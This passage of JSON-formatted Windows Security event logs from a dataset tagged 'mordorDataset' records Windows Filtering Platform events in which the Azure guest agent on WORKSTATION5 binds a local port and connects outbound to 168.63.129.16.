03:29:50","LayerRTID":"48","Task":12810,"EventTime":"2020-09-04 03:29:48","Channel":"Security","Protocol":"6","@timestamp":"2020-09-04T07:29:50.621Z","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceAddress":"172.18.39.6","RemoteMachineID":"S-1-0-0"}
{"Version":0,"Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3192\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054718\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t50060\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054718\\guestagent\\windowsazureguestagent.exe","FilterRTID":"0","LayerName":"%%14608","Opcode":"Info","SourceName":"Microsoft-Windows-Security-Auditing","Hostname":"WORKSTATION5.theshire.local","EventType":"AUDIT_SUCCESS","ThreadID":5852,"RecordNumber":74057,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9214364837600034816,"Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","EventID":5158,"ProcessId":"3192","port":53971,"@version":"1","SourcePort":"50060","Category":"Filtering Platform Connection","EventReceivedTime":"2020-09-04 03:29:50","LayerRTID":"36","Task":12810,"EventTime":"2020-09-04 03:29:48","Channel":"security","Protocol":"6","@timestamp":"2020-09-04T07:29:50.621Z","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceAddress":"0.0.0.0"}
{"Version":1,"Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3192\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054718\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t50060\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t73205\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-04_054718\\guestagent\\windowsazureguestagent.exe","FilterRTID":"73205","LayerName":"%%14611","Opcode":"Info","SourceName":"Microsoft-Windows-Security-Auditing","Hostname":"WORKSTATION5.theshire.local","EventType":"AUDIT_SUCCESS","ThreadID":5852,"RecordNumber":74058,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":-9214364837600034816,"DestPort":"80","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","EventID":5156,"DestAddress":"168.63.129.16","Direction":"%%14593","port":53971,"RemoteUserID":"S-1-0-0","@version":"1","SourcePort":"50060","ProcessId":"3192","Category":"Filtering Platform Connection","EventReceivedTime":"2020-09-04 03:29:50","LayerRTID":"48","Task":12810,"EventTime":"2020-09-04 03:29:48","Channel":"security","Protocol":"6","@timestamp":"2020-09-04T07:29:50.621Z","ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceAddress":"172.18.39.5","RemoteMachineID":"S-1-0-0"}
